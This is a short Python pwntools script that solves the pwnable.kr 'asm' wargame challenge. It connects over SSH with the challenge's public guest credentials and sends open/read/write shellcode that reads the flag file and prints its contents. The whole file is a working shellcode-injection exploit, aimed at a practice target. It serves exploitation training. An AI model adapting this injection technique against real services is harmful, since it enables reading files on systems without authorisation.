# coding: utf-8

from pwn import *
import time

context.arch = 'amd64'

con = ssh(host="pwnable.kr", user="asm", password="guest", port = 2222)
p = con.connect_remote("localhost", 9026)

shellcode = ""
shellcode += shellcraft.open("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
shellcode += shellcraft.read("rax", "rsp", 100)
shellcode += shellcraft.write(1, "rsp", 100)
print shellcode
print p.recv()
time.sleep(1)
p.send(asm(shellcode))
print p.recvline()
